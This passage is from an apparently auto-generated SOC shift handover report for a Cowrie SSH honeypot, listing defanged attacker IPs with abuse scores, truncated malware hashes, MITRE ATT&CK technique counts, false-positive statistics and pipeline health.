| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `85.11.167[.]220` | NL | SOFCOMPANY Ltd | **100** ⚠️ | 4 |
| `185.92.182[.]129` | US | as56971 network | **100** ⚠️ | 37 |
| `35.216.140[.]3` | CH | Google LLC | **100** ⚠️ | 50 |
| `151.40.205[.]12` | IT | WIND TRE S.P.A. | **100** ⚠️ | 6 |
| `86.177.76[.]168` | GB | BT CENTRAL PLUS | **100** ⚠️ | 2 |
| `18.206.156[.]151` | US | Amazon Technologies Inc. | **100** ⚠️ | 36 |
| `103.165.139[.]145` | ID | PT iForte Global Internet | **100** ⚠️ | 50 |
| `58.209.82[.]184` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `49.207.40[.]162` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 41 |
| `41.216.177[.]55` | ID | Atha media prima | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 200 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 114 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 37 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |

---

## 🔕 False Positive Summary (865 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 463 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 28 |
| AbuseIPDB score 16 below threshold 25 | 192 |
| AbuseIPDB score 17 below threshold 25 | 40 |
| AbuseIPDB score 21 below threshold 25 | 24 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 19 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 17 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 37 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 38 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1071 cases |
| Tool 34  | Credential Extractor        | ✅ 192 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 118 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 865 filtered (80.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 118 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-30T14:06:15Z_
